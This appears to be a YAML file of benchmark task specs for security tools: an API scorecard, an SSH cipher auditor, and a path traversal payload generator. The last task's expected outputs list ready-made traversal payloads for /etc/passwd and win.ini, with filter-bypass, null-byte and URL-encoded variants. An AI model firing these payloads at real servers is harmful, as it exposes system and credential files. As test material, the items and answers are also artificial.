- id: "SEC-083"
  title: "API Security Scorecard Generator"
  description: "Reads an API base URL from stdin. Runs a suite of security checks and generates a comprehensive security scorecard with scores per category and an overall grade."
  difficulty: 5
  stdlib_modules: [std.http, std.json, std.str, std.crypto, std.net, std.time]
  input_format: "Single line: API base URL"
  output_format: "JSON scorecard: {url, overallGrade, overallScore, categories: {auth, transport, headers, rateLimit, inputValidation, errorHandling}, issues: [...], recommendations: [...]}"
  test_cases:
    - input: "http://localhost:8083"
      expected_output: "overallGrade"
    - input: "https://api.example.com"
      expected_output: "overallScore"
  constraints:
    - "Must test: HTTPS enforcement, security headers, auth required, rate limiting, error message leakage"
    - "Overall grade A-F based on weighted scores"
    - "Must not be destructive (no DELETE or write operations)"

- id: "SEC-084"
  title: "SSH Configuration Auditor"
  description: "Reads an SSH server address from stdin. Connects and gathers server capabilities (banner, kex algorithms, ciphers, MACs, host key types) and audits them for security."
  difficulty: 4
  stdlib_modules: [std.net, std.str, std.json, std.crypto]
  input_format: "Single line: host:port"
  output_format: "JSON {host, banner, kexAlgorithms, ciphers, macs, hostKeyTypes, issues: [...], grade}"
  test_cases:
    - input: "localhost:22"
      expected_output: "grade"
    - input: "ssh.example.com:22"
      expected_output: "banner"
  constraints:
    - "Weak kex: diffie-hellman-group1-sha1, diffie-hellman-group14-sha1"
    - "Weak ciphers: 3des-cbc, arcfour, blowfish-cbc"
    - "Weak MACs: hmac-md5, hmac-sha1"
    - "Must not attempt authentication"

- id: "SEC-085"
  title: "Path Traversal Payload Generator"
  description: "Reads a target file path and encoding type from stdin. Generates a comprehensive set of path traversal payloads targeting that file, in the specified encoding."
  difficulty: 2
  stdlib_modules: [std.str, std.json, std.crypto]
  input_format: "First line: target file (e.g. /etc/passwd). Second line: encoding (none|url|double_url|unicode|all)"
  output_format: "JSON array of {payload, encoding, description}"
  test_cases:
    - input: "/etc/passwd\nnone"
      expected_output: "[{\"description\": \"Single dot-dot-slash traversal\", \"encoding\": \"none\", \"payload\": \"../etc/passwd\"}, {\"description\": \"Double dot-dot-slash traversal\", \"encoding\": \"none\", \"payload\": \"../../etc/passwd\"}, {\"description\": \"Triple dot-dot-slash traversal\", \"encoding\": \"none\", \"payload\": \"../../../etc/passwd\"}, {\"description\": \"Quadruple dot-dot-slash traversal\", \"encoding\": \"none\", \"payload\": \"../../../../etc/passwd\"}, {\"description\": \"Quintuple dot-dot-slash traversal\", \"encoding\": \"none\", \"payload\": \"../../../../../etc/passwd\"}, {\"description\": \"Bypass filter with ....//\", \"encoding\": \"none\", \"payload\": \"....//etc/passwd\"}, {\"description\": \"Triple ....// bypass\", \"encoding\": \"none\", \"payload\": \"....//....//....//etc/passwd\"}, {\"description\": \"Windows-style backslash traversal\", \"encoding\": \"none\", \"payload\": \"..\\\\..\\\\..\\\\etc\\\\passwd\"}, {\"description\": \"Double-slash traversal\", \"encoding\": \"none\", \"payload\": \"..//..//..//etc/passwd\"}, {\"description\": \"Null byte termination\", \"encoding\": \"none\", \"payload\": \"../../../etc/passwd\\u0000\"}, {\"description\": \"Leading current-dir prefix\", \"encoding\": \"none\", \"payload\": \"./../../etc/passwd\"}, {\"description\": \"Absolute-style /.. traversal\", \"encoding\": \"none\", \"payload\": \"/../../../../../etc/passwd\"}]"
    - input: "/windows/win.ini\nurl"
      expected_output: "[{\"description\": \"Single dot-dot-slash traversal\", \"encoding\": \"url\", \"payload\": \"%2e%2e%2f%77%69%6e%64%6f%77%73%2f%77%69%6e%2e%69%6e%69\"}, {\"description\": \"Double dot-dot-slash traversal\", \"encoding\": \"url\", \"payload\": \"%2e%2e%2f%2e%2e%2f%77%69%6e%64%6f%77%73%2f%77%69%6e%2e%69%6e%69\"}, {\"description\": \"Triple dot-dot-slash traversal\", \"encoding\": \"url\", \"payload\": \"%2e%2e%2f%2e%2e%2f%2e%2e%2f%77%69%6e%64%6f%77%73%2f%77%69%6e%2e%69%6e%69\"}, {\"description\": \"Quadruple dot-dot-slash traversal\", \"encoding\": \"url\", \"payload\": \"%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%77%69%6e%64%6f%77%73%2f%77%69%6e%2e%69%6e%69\"}, {\"description\": \"Quintuple dot-dot-slash traversal\", \"encoding\": \"url\", \"payload\": \"%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%77%69%6e%64%6f%77%73%2f%77%69%6e%2e%69%6e%69\"}, {\"description\": \"Bypass filter with ....//\", \"encoding\": \"url\", \"payload\": \"%2e%2e%2e%2e%2f%2f%77%69%6e%64%6f%77%73%2f%77%69%6e%2e%69%6e%69\"}, {\"description\": \"Triple ....// bypass\", \"encoding\": \"url\", \"payload\": \"%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%77%69%6e%64%6f%77%73%2f%77%69%6e%2e%69%6e%69\"}, {\"description\": \"Windows-style backslash traversal\", \"encoding\": \"url\", \"payload\": \"%2e%2e%5c%2e%2e%5c%2e%2e%5c%77%69%6e%64%6f%77%73%5c%77%69%6e%2e%69%6e%69\"}, {\"description\": \"Double-slash traversal\", \"encoding\": \"url\", \"payload\": \"%2e%2e%2f%2f%2e%2e%2f%2f%2e%2e%2f%2f%77%69%6e%64%6f%77%73%2f%77%69%6e%2e%69%6e%69\"}, {\"description\": \"Null byte termination\", \"encoding\": \"url\", \"payload\": \"%2e%2e%2f%2e%2e%2f%2e%2e%2f%77%69%6e%64%6f%77%73%2f%77%69%6e%2e%69%6e%69%00\"}, {\"description\": \"Leading current-dir prefix\", \"encoding\": \"url\", \"payload\": \"%2e%2f%2e%2e%2f%2e%2e%2f%77%69%6e%64%6f%77%73%2f%77%69%6e%2e%69%6e%69\"}, {\"description\": \"Absolute-style /.. traversal\", \"encoding\": \"url\", \"payload\": \"%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%77%69%6e%64%6f%77%73%2f%77%69%6e%2e%69%6e%69\"}]"
